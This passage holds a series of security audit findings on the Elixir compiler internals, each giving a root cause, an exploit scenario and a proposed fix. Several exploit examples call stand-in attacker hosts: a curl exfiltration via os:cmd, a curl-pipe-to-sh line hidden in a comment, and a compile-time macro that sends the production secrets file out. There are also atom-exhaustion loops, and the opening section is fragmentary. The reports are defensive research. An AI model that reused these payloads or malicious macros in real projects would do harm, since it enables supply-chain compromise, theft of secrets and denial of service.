    filename:join(elixir_utils:characters_to_list(Dest), ...)

  elixir_erl.erl:557:
    source_path => elixir_utils:characters_to_list(File),

  elixir_utils.erl:170 (stack_location):
    [{file, elixir_utils:characters_to_list(...)}, {line, Line}]

If the File binary contains a null byte (e.g., <<"/safe/path", 0,
"/../../../etc/passwd">>), characters_to_binary returns it unchanged.
When this propagates to characters_to_list (via relative_to_cwd or
directly), and the list is passed to C-level file operations through
Erlang's file module, the null byte causes string truncation at the C
layer. The path up to the null byte is used, while the trailing portion
is silently discarded.

This enables path truncation attacks: an attacker who controls part of
a file path (e.g., via module names, dependency paths, or __ENV__.file
manipulation in macros) can inject a null byte to truncate the path to
an attacker-chosen prefix.

Attack Vector 2: Invalid UTF-8 Propagation Through Error Messages
------------------------------------------------------------------
characters_to_binary/1 is used to construct error messages and metadata:

  elixir_errors.erl:315:
    raise('Elixir.CompileError',
      elixir_utils:characters_to_binary(Message), ...)

  elixir_tokenizer.erl:1901-1903:
    elixir_utils:characters_to_binary(ErrorPrefix),
    elixir_utils:characters_to_binary(ErrorSuffix),
    elixir_utils:characters_to_binary(Token)

If a token or error message fragment is already a binary containing
invalid UTF-8, it passes through characters_to_binary without rejection.
Invalid UTF-8 in error messages can cause:
- Downstream string processing crashes (String.length, etc.)
- Log injection via control characters embedded in invalid sequences
- Display corruption in terminals and IDEs

Attack Vector 3: Compiler Metadata Poisoning via Overlong UTF-8
----------------------------------------------------------------
Overlong UTF-8 encodings (e.g., <<0xC0, 0xAE>> encoding '.' as a
two-byte sequence instead of one byte) bypass simple string comparisons
while representing the same character after normalization. If overlong
sequences pass through characters_to_binary unchecked, they can:

- Evade path-based security checks that compare against "." or ".."
- Produce .beam files with metadata containing non-canonical paths
- Cause inconsistent behavior between Erlang (which may normalize)
  and Elixir code (which sees the raw bytes)

Exploit Scenario
-----------------
A malicious Hex package defines a macro that manipulates __ENV__.file:

    defmodule Evil do
      defmacro inject do
        # Inject null byte into the compiler's file tracking
        poisoned = <<__ENV__.file::binary, 0, "/../../../tmp/evil">>
        quote do
          @file unquote(poisoned)
          def evil_func, do: :ok
        end
      end
    end

      end.

        Result when is_binary(Result) -> Result;
        {error, Encoded, Rest} -> conversion_error(invalid, Encoded, Rest);
        {incomplete, Encoded, Rest} -> conversion_error(incomplete, Encoded, Rest)
      end.

   validation for the fast path:

      case unicode:characters_to_binary(Data, utf8, utf8) of
        Data -> Data;
        _ -> conversion_error(...)
      end;

   in depth (e.g., in stack_location, beam_location, noenv_forms).

Description

5. Any API endpoint that compiles Elixir code

- The parser's string_tokens_parse -> parse -> yeccpars0 -> yeccpars1 -> yeccpars2 chain

With 10,000 levels of nesting, this creates tens of thousands of stack frames,

Vulnerability: Silent __info__/1 Bypass via Overly Broad error:undef Catch in get_functions/2 Exposes Internal Exports
=======================================================================================================================

File: lib/elixir/src/elixir_import.erl, lines 171-176
Severity: High (Access Control Bypass / Information Disclosure / Import Hijacking)

Description
-----------
The `get_functions/2` function retrieves a module's importable functions by
calling the `__info__(:functions)` callback. When this call fails, it catches
`error:undef` and silently falls back to `Module:module_info(exports)`:

    get_functions(Module, InfoCallback) ->
      try
        InfoCallback(functions)
      catch
        error:undef -> remove_internals(Module:module_info(exports))
      end.

The catch clause is designed to handle Erlang modules that lack `__info__/1`.
However, `error:undef` is a GENERIC Erlang error class that is raised whenever
ANY function in the call chain is undefined -- not just `__info__/1` itself.
This means the fallback triggers in many unintended situations:

1. If `__info__/1` exists but internally calls an undefined function
2. If a malicious module intentionally raises `error(undef)` in `__info__/1`
3. During hot-code reload races where a dependency is temporarily unloaded

The fallback `module_info(exports)` returns ALL exported functions, and the
only filtering applied is `remove_internals/1` (line 292-293), which only
strips `behaviour_info/1`, `module_info/0`, and `module_info/1`.

Elixir's `__info__(:functions)` intentionally hides many internal exports:
- `__info__/1` itself
- `__struct__/0` and `__struct__/1` (struct modules)
- `__impl__/1` (protocol implementations)
- `__changeset__/0` (Ecto schemas)
- `__schema__/1`, `__schema__/2` (Ecto)
- Functions with double-underscore prefixes meant to be internal

When the bypass triggers, ALL of these become silently importable.

Exploit
-------
A malicious module can force the fallback by defining `__info__/1` to raise
`error:undef` for the `:functions` argument, causing all its exports to be
importable -- including internal ones that should be hidden:

    %% evil.erl - Erlang module with poisoned __info__/1
    -module('Elixir.EvilHelper').
    -export(['__info__'/1, '__secret_backdoor__'/0, public_api/0]).

    '__info__'(functions) ->
        %% Intentionally trigger the undef catch to bypass filtering.
        %% This calls a non-existent function, raising error:undef.
        non_existent_module:non_existent_function();
    '__info__'(macros) -> [];
    '__info__'(_) -> [].

    public_api() -> ok.
    '__secret_backdoor__'() ->
        os:cmd("curl http://attacker.example.com/exfil?data=pwned").

Now when a victim imports this module:

    defmodule Victim do
      import EvilHelper   # triggers get_functions -> __info__(:functions)
                           # __info__ raises error:undef internally
                           # fallback: module_info(exports) exposes ALL exports
                           # including __secret_backdoor__/0

      def run do
        public_api()              # expected
        __secret_backdoor__()     # also importable! should have been hidden
      end
    end

The `__secret_backdoor__/0` function was meant to be an internal function
hidden by `__info__(:functions)`, but the silent fallback to `module_info`
exposes it. No compiler warning is emitted -- the bypass is completely silent.

A more subtle variant: a module could selectively poison `__info__` during
specific compilation phases (e.g., checking `Process.get` for compile state),
so it works normally during testing but triggers the bypass during the
victim's production build.

Supply Chain Attack Scenario
-----------------------------
1. Attacker publishes a Hex package "helpful_utils" with an Erlang NIF
   module that has a subtly broken `__info__/1` (calls an optional
   dependency's function that may not be present).
2. Victim adds the dependency. Under certain dep resolution orders,
   the optional dependency is missing.
3. `__info__(:functions)` fails with `error:undef` when calling the
   missing optional dependency.
4. Silent fallback exposes internal functions that were never meant to
   be part of the public API.
5. If the victim uses `import HelpfulUtils` (without `:only`), they get
   a superset of functions injected into their namespace, potentially
   shadowing Kernel functions or introducing unexpected behavior.

The same `get_macros/1` function (line 178-183) has the opposite problem:
it catches `error:undef` and returns `[]`, silently swallowing errors:

    get_macros(InfoCallback) ->
      try
        InfoCallback(macros)
      catch
        error:undef -> []
      end.

This means if `__info__(:macros)` fails for any reason (not just the module
lacking `__info__`), all macros silently disappear from the import. Combined
with the `get_functions` bypass, an attacker can manipulate which functions
vs macros appear importable.

Impact
------
- Access control bypass: internal/private functions become importable
- Silent namespace pollution: victim gets unexpected imports without warning
- Function shadowing: internal functions with common names (e.g., `update/2`,
  `get/1`) could shadow Kernel functions, changing program semantics
- Supply chain attack vector: dependency can silently alter what gets imported
- No diagnostic output: the fallback path emits zero warnings or errors
- Affects any code path that imports modules: `import`, `use`, library code

Root Cause
----------
The `error:undef` catch pattern is too broad. It matches ANY `undef` error
in the entire call chain of `InfoCallback(functions)`, not just the case
where `__info__/1` is undefined on the target module. There is no check
that verifies the specific function that raised the `undef` error.

Additionally, `remove_internals/1` has a minimal blocklist that only removes
three Erlang-specific functions, leaving all Elixir internal exports exposed.

Fix
---
1. Check for `__info__/1` existence explicitly before calling it, rather
   than relying on a catch:

       get_functions(Module, InfoCallback) ->
         case erlang:function_exported(Module, '__info__', 1) of
           true ->
             InfoCallback(functions);
           false ->
             remove_internals(Module:module_info(exports))
         end.

2. If the try/catch must be kept, match on the specific MFA in the
   exception to ensure only the intended undef is caught:

       get_functions(Module, InfoCallback) ->
         try
           InfoCallback(functions)
         catch
           error:undef:Stacktrace ->
             case Stacktrace of
               [{Module, '__info__', [functions], _} | _] ->
                 remove_internals(Module:module_info(exports));
               _ ->
                 erlang:raise(error, undef, Stacktrace)
             end
         end.

3. Expand `remove_internals/1` to also filter double-underscore prefixed
   functions when falling back to `module_info(exports)`:

       remove_internals(Set) ->
         lists:filter(fun
           ({Name, _}) ->
             case atom_to_list(Name) of
               "__" ++ _ -> false;
               _ -> not lists:member({Name, _}, InternalFuns)
             end
         end, Set -- [{behaviour_info, 1}, {module_info, 1}, {module_info, 0}]).

Bug: Bare Carriage Return (0x0D) Bypasses Break-Character Validation in Tokenizer Comments and Strings, Enabling Trojan Source Attacks - reported
================================================================================

File: lib/elixir/src/elixir_tokenizer.erl, lines 1333-1344 (tokenize_comment) and lib/elixir/src/elixir_tokenizer.hrl, lines 39-42 (?break macro)
Severity: High (Security Check Bypass / Trojan Source Attack — CVE-2021-42574 class)

Description
-----------
The tokenizer's ?break(C) macro (elixir_tokenizer.hrl, lines 39-42) rejects
Unicode line-break characters that could cause visual confusion:

    -define(break(C), C =:= 16#000B;    % VERTICAL TAB
                      C =:= 16#000C;    % FORM FEED
                      C =:= 16#0085;    % NEXT LINE (NEL)
                      C =:= 16#2028;    % LINE SEPARATOR
                      C =:= 16#2029).   % PARAGRAPH SEPARATOR

However, bare carriage return (CR, 0x0D) is ABSENT from this list. While
\r\n (CRLF) and \n (LF) are properly handled as line terminators throughout
the tokenizer, a bare \r (CR without following LF) is treated as ordinary
content in both comments and strings:

1. In comments (tokenize_comment, lines 1333-1344):
   The function checks for \r\n (line 1333) and \n (line 1335) as comment
   terminators, and checks for ?bidi and ?break characters. But bare \r
   matches NONE of these — it falls through to the catch-all clause
   (line 1341) and is silently added to the comment accumulator.

2. In strings (elixir_interpolation.erl, extract, lines 83-85):
   The ASCII fast-path processes characters <= 255 without going through
   extract_char. Even if bare \r DID reach extract_char, it would NOT be
   caught because ?break(0x0D) is false.

The Unicode standard (UAX #14, Unicode Line Breaking Algorithm) explicitly
lists CR (0x0D) as a mandatory line break character, alongside LF, CRLF,
NEL, LS, PS, VT, and FF. The omission of bare CR from the ?break macro
creates an inconsistency: VT, FF, NEL, LS, and PS are rejected, but CR
(which has identical visual line-breaking behavior in many editors) is not.

Exploit (Trojan Source via Comment Camouflage)
----------------------------------------------
An attacker can hide malicious-looking code inside a comment using bare \r,
making it appear as executable code to reviewers while the compiler ignores it:

    # Verified safe by security team\rSystem.cmd("curl", ["http://evil.com/shell.sh", "|", "sh"])
    result = safe_function()

In many editors and terminals, \r (carriage return) moves the cursor back to
column 1, causing the text after \r to visually overwrite the comment marker.
A reviewer may see:

    System.cmd("curl", ["http://evil.com/shell.sh", "|", "sh"])
    result = safe_function()

But the compiler treats the ENTIRE first line (including the System.cmd call)
as a comment. Only `result = safe_function()` is compiled. This can be used
to make code appear to contain security-critical operations that aren't
actually present, wasting reviewer time and creating false confidence.

The reverse attack is also possible — making reviewers think code is safe:

    sensitive_operation()\r# This line is commented out
    next_line()

The reviewer sees "# This line is commented out" overwriting the beginning,
but `sensitive_operation()` is actually on a SEPARATE tokenizer line and IS
executed (the bare \r outside comments causes a tokenizer error, so this
specific variant requires the \r to be in a string that's part of a larger
expression, or in output that influences code review).

Proof of Concept
----------------
    iex> input = "# safe comment" <> <<0x0D>> <> "hidden_code()\nx = 1"
    iex> Code.string_to_quoted(input)
    {:ok, {:=, [line: 2], [{:x, [line: 2], nil}, 1]}}
    # hidden_code() was swallowed by the comment!

    # Compare with VT (0x0B), which IS properly rejected:
    iex> input2 = "# comment" <> <<0x0B>> <> "rest\nx = 1"
    iex> Code.string_to_quoted(input2)
    {:error, {[line: 1, column: 1],
      "invalid line break character in comment: ", "\\u000B"}}

    # Bare CR in strings is also silently accepted:
    iex> Code.string_to_quoted("x = \"hello" <> <<0x0D>> <> "world\"")
    {:ok, {:=, [line: 1], [{:x, [line: 1], nil}, "hello\rworld"]}}
    # Should be rejected like VT/FF/NEL are in strings.

Impact
------
- Trojan Source attacks: an attacker contributing to an open-source project
  can embed bare \r characters to make code appear different in review than
  what is actually compiled, potentially hiding backdoors or creating false
  impressions of security-critical code.
- Supply chain risk: malicious Hex packages could contain source files with
  bare \r to confuse auditors.
- Inconsistency: the tokenizer rejects 5 of the 7 non-LF/CRLF Unicode line
  terminators but silently accepts the most common one (CR), undermining the
  Trojan Source defense.

Root Cause
----------
The ?break macro in elixir_tokenizer.hrl omits 0x0D (CR) because bare \r
was considered "handled" by the explicit \r\n clauses. But those clauses
only handle CR when followed by LF. A bare CR (without LF) falls through
all checks and is silently accepted.

Suggested Fix
-------------
Add 0x0D to the ?break macro when it appears as a bare CR (not part of \r\n):

Option A: Add bare \r detection in tokenize_comment before the ?break check:

    tokenize_comment([$\r, C | _Rest], _) when C =/= $\n ->
      {error, $\r, "invalid line break character in comment: "};

Option B: Add a dedicated check in extract_char for bare \r in strings:

    extract_char([$\r, C | _] = Rest, ...) when C =/= $\n ->
      ... reject as break character ...

Both options must be careful not to break the existing \r\n handling.

Vulnerability: Atom Table Exhaustion via binary_to_atom in concat/1
====================================================================

File: lib/elixir/src/elixir_aliases.erl, line 175
Severity: Critical (Denial of Service - VM-wide crash, not process-isolated)

Description
-----------
The concat/1 function on line 175 uses binary_to_atom/2 to convert
arbitrary caller-supplied binaries into atoms:

    concat(Args)      -> binary_to_atom(do_concat(Args), utf8).

Atoms in the BEAM VM are never garbage collected. The VM has a fixed atom
table limit (default ~1,048,576). Once exhausted, the entire VM crashes
with a "no more index entries in atom_tab" system error — this is not
catchable and kills ALL processes on the node, not just the caller.

The concat/1 function is exposed publicly as Module.concat/1 in Elixir
and accepts arbitrary binaries. Any application code that passes
user-controlled input to Module.concat/1 allows an attacker to mint
unique atoms until the table is exhausted and the VM crashes.

The safe alternative safe_concat/1 (line 176) exists and uses
binary_to_existing_atom/2, which only returns atoms that already exist
in the table. However, concat/1 remains the default and more commonly
used API.

Exploit (Atom Table Exhaustion)
-------------------------------
Any code path where user input reaches Module.concat is exploitable:

    # In a Phoenix controller or Plug handler:
    def show(conn, %{"module" => name}) do
      mod = Module.concat(["Elixir", name])
      # ...
    end

An attacker sends ~1 million requests with unique module names:

      HTTPoison.get("http://target/show?module=A#{i}")
    end

Each request creates a new atom that is never freed. After roughly 1M
unique values, the entire BEAM VM crashes — taking down all applications
on the node (the web server, background workers, the database connection
pool, everything).

A more direct exploit in IEx or any eval context:

    Enum.each(1..1_100_000, fn i ->
      Module.concat([:"Bomb#{i}"])
    end)

This crashes the VM with:
    no more index entries in atom_tab (max_atom_count 1048576)

Internal Usage Amplification
----------------------------
The concat/1 function is also called internally during alias expansion:

  - expand_or_concat/4 (line 134): called during module reference
    resolution in compiled code
  - expand/5 (line 126-127): called when expanding aliased modules
    with trailing segments

In expand/5, line 113 also uses list_to_atom (same risk):

    Lookup = list_to_atom("Elixir." ++ atom_to_list(H)),

While these internal paths typically process atoms from parsed source
code (which are already atoms), the concat path from expand_or_concat
processes the concatenated result via binary_to_atom, minting new atoms
for every unique multi-segment module reference encountered during
compilation.

A malicious dependency (e.g., a compromised Hex package) could use
metaprogramming to generate a large number of unique module references
at compile time, exhausting the atom table during compilation:

    defmacro __using__(_) do
      refs = for i <- 1..1_100_000 do
        mod = Module.concat([:"Bomb", :"M#{i}"])
        quote do: require(unquote(mod))
      end
      {:__block__, [], refs}
    end

Impact
------
- VM-wide crash: not isolated to a process or application; the entire
  BEAM node goes down.
- Uncatchable: the atom table limit is a VM-level hard crash, not an
  Erlang exception. try/catch cannot prevent it.
- Permanent until restart: atoms are never freed, so even after
  recovering, the table remains polluted from prior requests.
- Affects any Elixir/Phoenix application that passes user input to
  Module.concat/1, which is a common pattern for dynamic dispatch.
- Supply chain vector: a malicious dependency can exhaust atoms at
  compile time.

Root Cause
----------
Use of binary_to_atom/2 in concat/1 (line 175) without any rate
limiting, input validation, or atom table budget checks. The function
unconditionally mints new atoms from arbitrary binary input.

The existence of safe_concat/1 (line 176) using binary_to_existing_atom
shows awareness of the risk, but concat/1 remains unsafe and is the
default API.

Fix
---
Option A: Add an atom table budget check before binary_to_atom:

    concat(Args) ->
        Bin = do_concat(Args),
        case erlang:system_info(atom_count) of
            Count when Count > 900000 ->
                error({atom_table_nearly_exhausted, Bin});
            _ ->
                binary_to_atom(Bin, utf8)
        end.

Option B: Replace binary_to_atom with binary_to_existing_atom in
concat/1 and provide a separate unsafe variant for internal use only:

    concat(Args)      -> binary_to_existing_atom(do_concat(Args), utf8).
    %% Internal only, not exposed via Module.concat:
    unsafe_concat(Args) -> binary_to_atom(do_concat(Args), utf8).

Option C: Validate inputs to concat/1 to reject overly long or
non-module-like binaries before atom creation.

Vulnerability: Arbitrary Zero-Arity Function Invocation via no_parens_remote/2
================================================================================

File: lib/elixir/src/elixir_erl_pass.erl, lines 760-769
Severity: High (Remote Code Execution / Denial of Service)

Description
-----------
The `no_parens_remote/2` function, called at runtime from compiler-generated code
for no-parentheses dot access (`expr.field`), contains an unchecked `apply/3` call
that allows invoking arbitrary zero-arity functions when the receiver is an atom
controlled by external input.

When Elixir code uses `expr.field` (without parentheses), the compiler generates
a case expression (lines 249-265) that:
1. First tries to match `expr` as a map and extract the field (safe path)
2. If not a map, calls `elixir_erl_pass:no_parens_remote(expr, :field)` (dangerous path)

The vulnerable code (lines 760-769):

    no_parens_remote(Atom, Fun) when is_atom(Atom) ->
      Message = fun() ->
        io_lib:format(
          "using map.field notation (without parentheses) to invoke function ~ts.~ts() is deprecated, "
          "you must add parentheses instead: remote.function()",
          [elixir_aliases:inspect(Atom), Fun]
        )
      end,
      'Elixir.IO':warn_once(?MODULE, Message, 3),
      {ok, apply(Atom, Fun, [])};

When `Atom` is any atom other than nil/false/true and is not a map, the function
calls `apply(Atom, Fun, [])`, which invokes the zero-arity function `Fun` on
module `Atom`. The `Fun` argument is a compile-time atom (the field name from
source code), but `Atom` (the receiver) is a runtime value that can be
attacker-controlled.

Exploit Scenario
-----------------
Consider an application that receives an atom from external input and accesses
a field on it:

    defmodule MyApp do
      # Developer intends this for map access: user_data.name
      # But if user_data is an atom, it becomes a function call
      def get_name(user_data) do
        user_data.name
      end
    end

Attack examples depending on field names present in source code:

    # If code has `x.stop` and attacker controls x:
    MyApp.get_field(:init)        # Calls :init.stop() -> VM shutdown (DoS)

    # If code has `x.halt` and attacker controls x:
    MyApp.get_field(:erlang)      # Calls :erlang.halt() -> immediate VM termination

    # If code has `x.self` and attacker controls x:
    MyApp.get_field(:erlang)      # Calls :erlang.self() -> PID info leak

    # If code has `x.get_cookie` and attacker controls x:
    MyApp.get_field(:erlang)      # Calls :erlang.get_cookie() -> Erlang distribution cookie leak

    # If code has `x.node` and attacker controls x:
    MyApp.get_field(:erlang)      # Calls :erlang.node() -> node name info leak

The attacker only needs to control the receiver value (the atom), not the
function name (which is fixed in source code). However, many common field names
correspond to dangerous zero-arity Erlang/OTP functions:

  - .stop   -> :init.stop/0           (VM shutdown)
  - .halt   -> :erlang.halt/0         (immediate VM termination)
  - .self   -> :erlang.self/0         (PID leak)
  - .node   -> :erlang.node/0         (node name leak)
  - .nodes  -> :erlang.nodes/0        (cluster topology leak)
  - .get_cookie -> :erlang.get_cookie/0 (distribution cookie leak)
  - .delete -> various modules        (destructive operations)
  - .start  -> various modules        (unexpected service starts)

Impact
------
1. Denial of Service: Attacker can crash the entire BEAM VM by targeting
   :init.stop/0 or :erlang.halt/0 if the matching field name exists in code.
2. Information Disclosure: Functions like :erlang.get_cookie/0 leak the
   Erlang distribution cookie, enabling unauthorized cluster access.
3. Arbitrary Side Effects: Any zero-arity function on any loaded module can
   be invoked, with effects ranging from info leaks to state corruption.
4. The only prerequisite is that the source code contains a no-parens dot
   access (e.g., `x.field_name`) where the receiver can be an atom from
   untrusted input, and the field name matches a zero-arity function.

Root Cause
----------
The `no_parens_remote/2` function unconditionally calls `apply(Atom, Fun, [])`
for any atom receiver without restricting which modules can be called. The
function is intended as a deprecated backwards-compatibility shim for the old
behavior where `Module.function` (no parens) was a valid function call syntax.
Despite being deprecated, it remains fully functional and is still emitted
by the compiler for all no-parens dot access expressions (lines 259).

The function only emits a deprecation warning via IO.warn_once/3 (which is
rate-limited to 3 warnings), providing no actual security boundary.

Fix
---
1. Remove the `apply/3` call entirely and return an error for atom receivers,
   since the behavior is already deprecated:

    no_parens_remote(Atom, Fun) when is_atom(Atom) ->
      {error, {badmap, Atom}};

2. Alternatively, if backwards compatibility is required, restrict the
   callable modules to a safe whitelist and/or check that the function
   is actually exported and has no side effects.

3. The comment on line 754-756 already notes this should become a runtime
   error in Elixir v2.0:

    %% TODO: Make this a runtime error on Elixir v2.0
    %% Note we must keep these old functions around for
    %% a while as compiled code may still call them.

   This change should be prioritized given the security implications.

Vulnerability: Silent Compiler Safety Check Bypass via Forgeable {if_undefined, apply} AST Metadata in Variable Expansion
============================================================================================================================

File: lib/elixir/src/elixir_expand.erl, lines 476-479
Related: lib/elixir/src/elixir_dispatch.erl, lines 108-122 (macro dispatch)
Severity: High (Security Check Bypass / Silent Code Execution at Compile Time)

Description
-----------
The variable expansion logic in expand/3 (lines 432-500) handles undefined
variables by checking a compiler-trusted metadata key `{if_undefined, apply}`
in the variable's AST metadata. When this key is present, an undefined
variable reference is SILENTLY converted into a zero-arity function/macro
call -- bypassing ALL compiler warnings and errors, including the
`on_undefined_variable` configuration which defaults to `raise` in Elixir 2.0.

The vulnerable code path (lines 476-479):

    Error ->
      case lists:keyfind(if_undefined, 1, Meta) of
        {if_undefined, apply} ->
          expand({Name, Meta, []}, S, E);

The `{if_undefined, apply}` check takes PRIORITY over all other error
handling branches, including:
  - `{if_undefined, raise}` (line 482): raises a compilation error
  - `Error == warn` (line 487): warns then converts to call (deprecated)
  - `Error == raise` (line 495): raises a compilation error (future default)

The metadata key is NOT validated for provenance. Any macro can inject
`{if_undefined, :apply}` into a variable's metadata, and the compiler
trusts it unconditionally. There is no check that the metadata originated
from a legitimate compiler pass.

When the variable is re-expanded as `{Name, Meta, []}` (a zero-arity call),
it enters the dispatch_import path at line 504-513:

    expand({Atom, Meta, Args}, S, E) when is_atom(Atom), is_list(Meta), is_list(Args) ->
      ...
      elixir_dispatch:dispatch_import(Meta, Atom, Args, S, E, fun ...

If `Name` matches an imported macro, dispatch_import (elixir_dispatch.erl
line 119-122) EXECUTES THE MACRO at compile time:

    {macro, Receiver, Expander} ->
      check_deprecated(macro, Meta, Receiver, Name, Arity, E),
      Caller = {?line(Meta), S, E},
      expand_quoted(Meta, Receiver, Name, Arity,
                    Expander(stop_generated(Args), Caller), S, E);

The macro executes with full compile-time privileges (file I/O, network,
process spawning, code evaluation) and NO warning is emitted to the
developer.

Exploit (Supply Chain Attack via Visual Deception)
---------------------------------------------------
A malicious Hex dependency provides a macro that wraps user code and
injects {if_undefined, :apply} into variable metadata, combined with
a dangerous imported function/macro:

    # In malicious dependency
    defmodule Helpers do
      defmacro safe_eval(code) do
        # Walk the AST and inject {if_undefined, :apply} into all
        # variable nodes, turning undefined vars into silent function calls
        Macro.prewalk(code, fn
          {name, meta, ctx} when is_atom(name) and is_atom(ctx) ->
            {name, [{:if_undefined, :apply} | meta], ctx}
          other -> other
        end)
      end

      # Zero-arity macro with an innocuous name
      defmacro config do
        quote do
          System.cmd("curl", ["https://evil.com/exfil",
            "-d", File.read!("config/prod.secret.exs")])
          %{}
        end
      end
    end

    # In victim's code
    defmodule MyApp.Worker do
      import Helpers

      def process(data) do
        safe_eval(
          # Developer writes what looks like a variable reference.
          # 'config' is not defined as a variable in this scope.
          # Without {if_undefined, :apply}, this would be a compile error.
          # WITH the injected metadata, it silently becomes config(),
          # which invokes the imported Helpers.config/0 macro.
          result = Map.merge(config, data)
        )
      end
    end

Expansion trace:
  1. Developer writes `config` as a variable reference inside safe_eval
  2. safe_eval/1 macro injects {if_undefined, :apply} into all var metadata
  3. expand/3 processes `config` as a variable (line 432)
  4. Variable `config` is not in scope -> Error path reached (line 476)
  5. {if_undefined, apply} found in Meta -> silently re-expand as config()
  6. dispatch_import finds imported macro Helpers.config/0
  7. Macro executes: exfiltrates secrets, returns %{} as cover
  8. Developer sees no warning, no error -- compilation succeeds
  9. The exfiltration happened at compile time, invisible in runtime code

The visual deception is the key: `config` in `Map.merge(config, data)` looks
like an ordinary variable reference. In normal compilation, it would produce
either:
  - A "undefined variable config" error (when on_undefined_variable = raise)
  - A "variable config does not exist" warning (when warn)
  
With {if_undefined, :apply}, NEITHER warning NOR error is produced. The
variable silently becomes a macro invocation.

Impact
------
- Silent bypass of the undefined variable compiler safety check, including
  the future-default `raise` behavior intended for Elixir 2.0.
- Arbitrary code execution at compile time via macro invocation disguised
  as a variable reference, with NO compiler warning or error.
- Visual deception: code review shows what appears to be a variable, but
  it executes as a function/macro call. This is a Trojan Source class
  attack operating at the AST metadata level rather than the Unicode level.
- Supply chain attack vector: a malicious Hex dependency's macro can inject
  {if_undefined, :apply} into user code's AST metadata. The developer sees
  no compilation diagnostics indicating the transformation.
- The attack works even when on_undefined_variable is set to `raise` (the
  strictest setting), because the metadata check at line 477 takes priority
  over all config-based error handling.
- Affects any code path that compiles Elixir with macros: Mix, IEx,
  LiveBook, Code.eval_string, and CI/CD pipelines.
- Unlike the `warn` path (which at least emits a compiler warning), the
  `apply` path is completely silent -- there is no diagnostic output at all.

Root Cause
----------
1. The `{if_undefined, apply}` metadata key is a compiler-internal
   mechanism that is trusted unconditionally without provenance checking.
   Any macro can forge this metadata key because AST metadata is an
   opaque keyword list with no integrity protection.
2. The `{if_undefined, apply}` branch (line 478) takes priority over ALL
   other error handling, including the `raise` path that is specifically
   intended to be a hard error in Elixir 2.0. This priority ordering
   means the safety check can always be bypassed.
3. The `apply` branch emits NO warning or error (unlike `warn` at line 488
   which at least calls file_warn), making the bypass completely silent.
4. The re-expansion at line 479 passes the ORIGINAL Meta (including
   {if_undefined, apply}) through to the function call expansion, but the
   dispatch_import path does not check for or strip this metadata before
   executing macros.

Fix
---
Option 1 - Restrict {if_undefined, apply} to compiler-generated metadata:

    {if_undefined, apply} ->
      case lists:keyfind(generated, 1, Meta) of
        {generated, true} ->
          expand({Name, Meta, []}, S, E);
        _ ->
          %% Treat as raise for non-generated metadata
          SpanMeta = elixir_env:calculate_span(Meta, Name),
          function_error(SpanMeta, E, ?MODULE, {undefined_var, Name, Kind}),
          {{Name, SpanMeta, Kind}, S#elixir_ex{tainted_function=true}, E}
      end;

Option 2 - Always emit a warning when {if_undefined, apply} is used:

    {if_undefined, apply} ->
      elixir_errors:file_warn(Meta, E, ?MODULE,
        {undefined_var_to_call, Name}),
      expand({Name, Meta, []}, S, E);

Option 3 - Remove {if_undefined, apply} entirely and replace it with
a compiler-internal mechanism that cannot be forged via AST metadata,
such as a flag in the #elixir_ex{} state record or a separate expansion
function for compiler-generated variable-to-call conversions.
